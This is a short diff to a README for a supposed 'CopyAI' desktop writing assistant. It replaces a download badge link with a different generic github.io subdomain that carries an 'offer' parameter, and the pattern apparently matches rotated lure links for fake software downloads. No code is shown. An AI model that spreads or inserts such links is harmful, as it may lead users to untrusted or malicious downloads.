@@ -1,6 +1,6 @@
 # CopyAI Download — Desktop Writing Assistant
 
-[![Get CopyAI GitHub](https://img.shields.io/badge/Get%20CopyAI%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://tools-git-app.github.io/.github/?offer=CopyAI)
+[![Get CopyAI GitHub](https://img.shields.io/badge/Get%20CopyAI%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://app-hub-load.github.io/.github/?offer=CopyAI)
 
 ---
 
